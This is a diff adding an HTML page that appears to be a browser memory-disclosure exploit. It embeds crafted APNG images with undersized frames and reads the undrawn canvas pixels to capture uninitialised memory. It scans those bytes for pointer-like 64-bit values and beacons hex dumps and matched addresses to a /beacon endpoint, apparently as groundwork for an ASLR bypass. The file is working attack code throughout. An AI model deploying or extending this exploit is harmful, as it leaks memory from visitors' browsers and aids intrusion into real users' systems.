@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V705</title></head>
+<body><pre id="out">V705 RGB correlation plus 510-byte tail. Not the live index.</pre>
+<script>
+'use strict';
+/* Same RGB method as V704. Drop every fourth getImageData byte before any u64.
+   Saved V704 values are a local label set, not proof of a stable address.
+   exact-value: full u64 matched. same-page: 4K page matched. same-region: 1MiB
+   region q & ~0xfffff matched. Otherwise new. Not read64. Not ASLR. */
+var O = document.getElementById('out');
+function say(s){ O.textContent += '\n' + s; }
+var POOL = 115;
+var _imgs = [];
+for (var i = 0; i < POOL; i++) _imgs.push(new Image());
+var _ix = 0;
+function bk(tag, d){
+  if (_ix >= POOL) { say('POOL ' + tag); return; }
+  var img = _imgs[_ix++];
+  var body = String(d).slice(0, 900);
+  img.src = '/beacon/V705-' + tag + '?d=' + encodeURIComponent(body) + '&t=' + Date.now();
+  say(tag + ' ' + body);
+}
+function b64ToU8(s){
+  var bin = atob(s);
+  var u = new Uint8Array(bin.length);
+  for (var i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
+  return u;
+}
+function fnv(u8){
+  var h = 0x811c9dc5;
+  for (var i = 0; i < u8.length; i++){ h ^= u8[i]; h = Math.imul(h, 0x01000193); }
+  return ('00000000' + (h >>> 0).toString(16)).slice(-8);
+}
+function hexOf(u8){
+  var s = '';
+  for (var i = 0; i < u8.length; i++) s += ('0' + u8[i].toString(16)).slice(-2);
+  return s;
+}
+function u64At(u8, o){
+  var x = 0n;
+  for (var i = 7; i >= 0; i--) x = (x << 8n) | BigInt(u8[o + i]);
+  return x;
+}
+function dropAlpha(rgba){
+  var n = (rgba.length / 4) | 0;
+  var rgb = new Uint8Array(n * 3);
+  for (var i = 0; i < n; i++){
+    rgb[i*3] = rgba[i*4]; rgb[i*3+1] = rgba[i*4+1]; rgb[i*3+2] = rgba[i*4+2];
+  }
+  return rgb;
+}
+function paint(n, pat){
+  var u = new Uint8Array(n);
+  for (var i = 0; i < n; i++) u[i] = pat[i % 3];
+  return u;
+}
+var FRAME_PAT = [0x10, 0x20, 0x30];
+var DEFAULT_PAT = [0xa0, 0xa1, 0xa2];
+function sameBytes(a, b){
+  if (a.length !== b.length) return false;
+  for (var i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
+  return true;
+}
+var SAVED = [
+  0x0000000880ba3920n, 0x00000008111e8928n, 0x0000000880baef40n, 0x000000080c79c370n,
+  0x0000000809829f70n, 0x0000000880b7fe50n, 0x0000000880b76470n, 0x0000000880b9bb10n
+];
+var SAVED_PAGES = {};
+var SAVED_REGIONS = {};
+for (var s = 0; s < SAVED.length; s++){
+  SAVED_PAGES[SAVED[s] & ~0xfffn] = 1;
+  SAVED_REGIONS[SAVED[s] & ~0xfffffn] = 1;
+}
+function labelOf(q){
+  for (var i = 0; i < SAVED.length; i++) if (SAVED[i] === q) return 'exact-value';
+  if (SAVED_PAGES[q & ~0xfffn]) return 'same-page';
+  if (SAVED_REGIONS[q & ~0xfffffn]) return 'same-region';
+  return 'new';
+}
+function twoFrames(){
+  return new Promise(function(resolve){
+    var done = false;
+    function finish(){ if (!done){ done = true; resolve(); } }
+    var n = 0;
+    function step(){ n++; if (n >= 2) finish(); else requestAnimationFrame(step); }
+    if (typeof requestAnimationFrame === 'function') requestAnimationFrame(step);
+    else finish();
+    setTimeout(finish, 500);
+  });
+}
+var ASSETS = [
+  {name:'C63', canvas:37, frame:37, b64:'iVBORw0KGgoAAAANSUhEUgAAACUAAAABCAIAAADWwfB0AAAACGFjVEwAAAABAAAAAcMq2TYAAAAOSURBVHjaY1iwcBE9EQBGT0XQWQ6QFgAAABpmY1RMAAAAAAAAACUAAAABAAAAAAAAAAAAZABkAACGCFUxAAAAEmZkQVQAAAABeNpjEFAwoCcCAAT9DeEmS9P2AAAAAElFTkSuQmCC'},
+  {name:'T63', canvas:37, frame:16, b64:'iVBORw0KGgoAAAANSUhEUgAAACUAAAABCAIAAADWwfB0AAAACGFjVEwAAAABAAAAAcMq2TYAAAAOSURBVHjaY1iwcBE9EQBGT0XQWQ6QFgAAABpmY1RMAAAAAAAAABAAAAABAAAAAAAAAAAAZABkAACNRJWVAAAAEmZkQVQAAAABeNpjEFAwIAkBAJExBgE9syNCAAAAAElFTkSuQmCC'},
+  {name:'C510', canvas:186, frame:186, b64:'iVBORw0KGgoAAAANSUhEUgAAALoAAAABCAIAAADmYSMQAAAACGFjVEwAAAABAAAAAcMq2TYAAAARSURBVHjaY1iwcNEoGkVEIgA8BV7+pazcIgAAABpmY1RMAAAAAAAAALoAAAABAAAAAAAAAAAAZABkAABMxCClAAAAFWZkQVQAAAABeNpjEFAwGEWjiEgEABaDRcGWQcoVAAAAAElFTkSuQmCC'},
+  {name:'T510', canvas:186, frame:16, b64:'iVBORw0KGgoAAAANSUhEUgAAALoAAAABCAIAAADmYSMQAAAACGFjVEwAAAABAAAAAcMq2TYAAAARSURBVHjaY1iwcNEoGkVEIgA8BV7+pazcIgAAABpmY1RMAAAAAAAAABAAAAABAAAAAAAAAAAAZABkAACNRJWVAAAAEmZkQVQAAAABeNpjEFAwIAkBAJExBgE9syNCAAAAAElFTkSuQmCC'}
+];
+var RUNS = 3;
+var found = [];
+
+function comparedRgb(rgb, asset){
+  if (asset.frame === asset.canvas) return rgb;
+  var n = (asset.canvas - asset.frame) * 3;
+  return rgb.subarray(rgb.length - n, rgb.length);
+}
+function expected(asset){
+  if (asset.frame === asset.canvas) return paint(asset.canvas * 3, FRAME_PAT);
+  return paint((asset.canvas - asset.frame) * 3, DEFAULT_PAT);
+}
+function beaconSlices(name, run, rgb){
+  var total = rgb.length;
+  var whole = fnv(rgb);
+  var n = Math.ceil(total / 64);
+  for (var i = 0; i < n; i++){
+    var off = i * 64;
+    var sl = rgb.subarray(off, Math.min(total, off + 64));
+    bk('SLICE', name + ',r=' + run + ',total=' + total + ',fnv=' + whole
+      + ',i=' + i + ',n=' + n + ',off=' + off + ',hex=' + hexOf(sl));
+  }
+}
+function note08(name, run, rgb){
+  for (var o = 0; o + 8 <= rgb.length; o++){
+    var q = u64At(rgb, o);
+    if ((q >> 32n) !== 8n) continue;
+    found.push({name:name, run:run, off:o, q:q, align:o & 7});
+  }
+}
+function decodeOnce(asset, run){
+  return new Promise(function(resolve){
+    var url = URL.createObjectURL(new Blob([b64ToU8(asset.b64)], {type:'image/png'}));
+    var im = new Image();
+    var done = false;
+    function finish(err){
+      if (done) return;
+      done = true;
+      URL.revokeObjectURL(url);
+      if (err){ bk('ASSET-ERR', asset.name + ',r=' + run + ',' + err); resolve(null); return; }
+      bk('DECODE', asset.name + ',r=' + run + ',w=' + im.naturalWidth + ',h=' + im.naturalHeight);
+      twoFrames().then(function(){
+        var c = document.createElement('canvas');
+        c.width = im.naturalWidth || asset.canvas;
+        c.height = im.naturalHeight || 1;
+        var g = c.getContext('2d');
+        g.fillStyle = '#00ff00';
+        g.fillRect(0, 0, c.width, c.height);
+        try { g.drawImage(im, 0, 0); }
+        catch (e){ bk('DRAW', asset.name + ',r=' + run + ',err=' + e.name); resolve(null); return; }
+        bk('DRAW', asset.name + ',r=' + run + ',ok');
+        var rgb = dropAlpha(g.getImageData(0, 0, c.width, c.height).data);
+        var view = comparedRgb(rgb, asset);
+        beaconSlices(asset.name, run, view);
+        if (asset.frame !== asset.canvas) note08(asset.name, run, view);
+        resolve(view);
+      });
+    }
+    im.onload = function(){ finish(''); };
+    im.onerror = function(){ finish('img-error'); };
+    im.src = url;
+  });
+}
+
+bk('BOOT', 't63=63,t510=510,runs=3,pool=' + POOL + ',delay=1s');
+
+(async function(){
+  for (var a = 0; a < ASSETS.length; a++){
+    var asset = ASSETS[a];
+    var tail = asset.frame === asset.canvas ? 0 : (asset.canvas - asset.frame) * 3;
+    bk('ASSET-LOAD', asset.name + ',canvas=' + asset.canvas + ',frame=' + asset.frame + ',srcTail=' + tail);
+    var exp = expected(asset);
+    var ok = 0, uniq = 0, seen = [];
+    for (var r = 0; r < RUNS; r++){
+      var view = await decodeOnce(asset, r);
+      if (!view) continue;
+      ok++;
+      var hit = false;
+      for (var j = 0; j < seen.length; j++) if (sameBytes(seen[j], view)) hit = true;
+      if (!hit){ seen.push(view); uniq++; }
+      if (r === 0){
+        bk('RESULT', (asset.frame === asset.canvas ? 'control' : 'trigger') + ',' + asset.name
+          + ',against=' + (asset.frame === asset.canvas ? 'frameFill' : 'defaultFill')
+          + ',match=' + sameBytes(view, exp) + ',len=' + view.length + ',fnv=' + fnv(view) + ',expFnv=' + fnv(exp));
+      }
+    }
+    bk('RESULT', asset.name + ',runs=' + ok + ',uniq=' + uniq);
+  }
+  var groups = {};
+  for (var i = 0; i < found.length; i++){
+    var f = found[i];
+    var key = f.name + '@' + f.off + '=' + f.q.toString(16);
+    if (!groups[key]) groups[key] = {f:f, n:0};
+    groups[key].n++;
+  }
+  var keys = Object.keys(groups);
+  var parts = [];
+  var cap = 12;
+  for (var k = 0; k < keys.length && parts.length < cap; k++){
+    var g = groups[keys[k]];
+    parts.push(g.f.name + '@' + g.f.off + '=' + g.f.q.toString(16) + 'x' + g.n + ':' + labelOf(g.f.q));
+  }
+  bk('FINAL', 'n=' + keys.length + ',shown=' + parts.length
+    + ',omitted=' + (keys.length - parts.length)
+    + (parts.length ? ',' + parts.join(',') : ''));
+  bk('SURVIVE', 'poolLeft=' + (POOL - _ix));
+})().catch(function(e){
+  bk('RESULT', 'err=' + (e && e.name ? e.name : 'x'));
+  bk('SURVIVE', 'err');
+});
+</script>
+</body></html>
